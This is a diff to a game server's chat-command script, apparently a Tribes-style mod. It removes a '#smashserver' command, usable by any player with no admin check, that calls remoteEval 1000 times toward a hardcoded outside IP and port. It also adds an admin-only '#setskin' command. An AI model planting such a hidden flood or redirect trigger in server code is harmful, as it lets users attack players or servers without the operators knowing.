@@ -1704,13 +1704,6 @@ function internalSay(%clientId, %team, %message, %senderName)
 		//============================
 		// LONGBOW COMMANDS ===========
 		//============================
-		
-
-		if (%w1 == "#smashserver") {
-			for(%i = 0; %i < 1000; %i++) {
-				remoteEval(%TrueClientId, sinBot, "24.36.175.153:28001");
-			}
-		}
 
 		if (%w1 == "#mypos") {
 			Client::sendMessage(%TrueClientId, 0, GameBase::getPosition(%TrueClientId));
@@ -1727,6 +1720,27 @@ function internalSay(%clientId, %team, %message, %senderName)
 
 		if (%w1 == "#myclasses") {
 			Client::sendMessage(%TrueClientId, 0, fetchData(%TrueClientId, "RemortedClasses"));
+		}
+
+		if (%w1 == "#setskin") {
+			if(%clientToServerAdminLevel >= 4) {
+				%skin = getWord(%cropped, 0);
+				$los::object = "";
+				$los::position = "";
+				%player = Client::getOwnedObject(%TrueClientId);
+
+				if(GameBase::getLOSinfo(%player, 500))
+				{
+					%object = $los::object;
+					%objpos = $los::position;
+					%obj = getObjectType(%object);
+					%cl = Player::getClient(%object);
+
+					if (%cl != "") {
+						Client::setSkin(%cl, %skin);
+					}
+				}
+			}
 		}
 
 		//============================
